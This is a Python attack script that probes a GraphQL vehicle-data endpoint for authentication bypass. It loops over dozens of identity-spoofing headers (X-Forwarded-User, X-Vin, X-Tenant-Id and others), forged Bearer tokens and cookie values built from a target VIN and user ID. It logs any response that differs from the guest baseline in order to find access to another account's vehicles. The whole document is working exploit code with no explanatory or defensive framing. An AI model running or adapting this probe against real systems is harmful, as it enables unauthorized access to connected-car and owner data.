import requests, itertools
URL="http://10.230.164.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV6FF52FEE9EDDD86"; USER="cc-715a9a001b4a5abad5ce3ecc"
hdr_names=["X-Forwarded-User","X-Auth-User","X-Remote-User","X-User","X-Username","X-User-Id",
"X-Vehicle-Id","X-Vehicle","X-Vin","X-VIN","X-Tbox-Id","X-Device-Id","X-Client-Id","X-Fleet-Id",
"X-Fleet","X-Tenant","X-Tenant-Id","X-Account","X-Subject","X-Principal","X-Identity",
"X-Api-Token","X-Access-Token","X-Auth","Auth","Session","X-Session","X-Session-Id"]
vals=[VIN, USER, "guest", "technician", "engineer", f"Bearer {VIN}", f"Bearer {USER}"]
diffs=0
for n in hdr_names:
    for v in vals:
        try:
            r=requests.post(URL,json={"query":"{vehicles{vin}}"},headers={n:v},timeout=5)
            t=r.text.strip()
            if t!=BASE:
                print("DIFF",n,v,r.status_code,t[:200],flush=True); diffs+=1
        except Exception as e: print("ERR",n,e)
# cookie variants
for ck in [f"vin={VIN}", f"token={VIN}", f"session={VIN}", f"user={USER}", f"vin={VIN}; user={USER}"]:
    try:
        r=requests.post(URL,json={"query":"{vehicles{vin}}"},headers={"Cookie":ck},timeout=5)
        t=r.text.strip()
        if t!=BASE: print("DIFF cookie",ck,r.status_code,t[:200],flush=True); diffs+=1
    except Exception as e: print("ERR cookie",e)
print("diffs",diffs)
